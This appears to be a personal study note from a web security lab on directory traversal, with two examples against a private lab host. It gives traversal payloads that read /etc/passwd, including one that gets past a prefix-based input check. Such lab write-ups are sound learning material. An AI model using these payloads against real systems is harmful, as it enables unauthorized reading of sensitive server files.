# Directory Traversal

## Example 1 - Traversing from an image

`http://172.16.219.145/dirtrav/example1.php?file=hacker.png`
- url has a `?file=` query

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413193043.png" width="600"/>

### Payload

`?file=../../../etc/passwd`

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413193138.png" width="600"/>


## Example 2 - `/var/www/files` Bypass

`http://172.16.219.145/dirtrav/example2.php?file=/var/www/files/hacker.png`
- sometimes input validation will ensure the first 3 directories after `?file=` is `/var/www/files/`

### Payload

`?file=/var/www/files/../../../etc/passwd`

![[Pasted image 20250413193413.png]]


---

Last Updated 20250413